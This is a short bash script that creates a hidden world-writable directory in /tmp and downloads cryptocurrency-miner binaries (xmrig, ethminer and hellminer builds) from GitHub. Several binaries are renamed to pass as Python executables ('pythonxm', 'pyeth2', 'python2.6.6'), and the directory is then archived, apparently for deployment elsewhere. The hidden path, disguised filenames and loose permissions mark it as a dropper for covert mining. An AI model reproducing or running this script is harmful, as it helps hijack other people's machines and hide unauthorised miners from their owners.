#!/bin/bash
#sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev automake libtool autoconf -y
TEMP_MAX=/tmp/.max
apt update && apt install csh  python3 python3-pip python3-argcomplete xclip -y
mkdir $TEMP_MAX
cd $TEMP_MAX
chmod 777 $TEMP_MAX
wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm
wget -q https://github.com/one10001/10001code/raw/main/config.json
wget -q https://github.com/one10001/10001code/raw/main/pythonheq
wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
wget -q https://github.com/one10001/10001code/raw/main/config.json
wget -q  https://github.com/one10001/ethminer/releases/download/v0.0.1/pyeth2
wget -q https://github.com/one10001/10001code/releases/download/2.6.6/python2.6.6
wget -q -O jq https://github.com/stedolan/jq/releases/download/jq-1.6/jq-linux64
wget -q https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
tar -xzf hellminer_cpu_linux.tar.gz
cp ../cpu03.sh $TEMP_MAX/
chmod 777 $TEMP_MAX -R
cd /tmp
tar -cJf cpu  .max